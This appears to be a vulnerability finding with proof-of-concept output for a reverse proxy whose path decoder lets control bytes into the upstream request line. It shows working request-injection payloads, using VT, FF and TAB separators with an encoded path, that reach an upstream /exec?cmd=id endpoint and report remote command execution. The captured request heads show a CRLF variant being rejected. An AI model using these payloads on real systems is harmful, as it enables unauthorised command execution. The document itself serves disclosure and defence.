source  : line 51 parseheader() decode loop; forwarded at line 64 upstream() request-line build
claim   : the decoded-path guard is ONLY 'if(ch==0||ch=='\\')return 400' — there is no c<32 test.
          Every 0x01-0x1F and 0x7F byte reaches the upstream line RAW. With proxy_pass .../api/
          the decoded path is concatenated onto 'GET ', so the injected separator is an extra
          token. On an upstream that (a) splits the request line on whitespace and (b) validates
          header lines, the CRLF form (SEC-001/002) is rejected at its orphaned ' HTTP/1.1' line
          while TAB/VT/FF remain a single legal line and still execute — they are the variant
          that survives a strict upstream. Payload uses /%61pi/ so the decoded branch is taken.

=== 1. strict header-validating upstream: CRLF 400s, control-separator form executes ===

--- CRLF %0d%0a  (SEC-001/002 form)
upstream 1st line : b'GET /a'
upstream head     : b'GET /a\r\nGET /exec?cmd=id HTTP/1.1\r\nHost: u\r\n HTTP/1.1\r\nHost: 127.0.0.1:59623\r\nConnection: close\r\n\r\n'
status            : HTTP/1.1 400 Bad Request
RCE               : False

--- VT   %0b    (this finding)
upstream 1st line : b'GET /exec\x0b?cmd=id HTTP/1.1'
upstream head     : b'GET /exec\x0b?cmd=id HTTP/1.1\r\nHost: 127.0.0.1:59623\r\nConnection: close\r\n\r\n'
status            : HTTP/1.1 200 OK
RCE               : True

--- FF   %0c    (this finding)
upstream 1st line : b'GET /exec\x0c?cmd=id HTTP/1.1'
upstream head     : b'GET /exec\x0c?cmd=id HTTP/1.1\r\nHost: 127.0.0.1:59623\r\nConnection: close\r\n\r\n'
status            : HTTP/1.1 200 OK
RCE               : True

--- TAB  %09    (same class)
upstream 1st line : b'GET /exec\t?cmd=id HTTP/1.1'
upstream head     : b'GET /exec\t?cmd=id HTTP/1.1\r\nHost: 127.0.0.1:59623\r\nConnection: close\r\n\r\n'
status            : HTTP/1.1 200 OK
RCE               : True

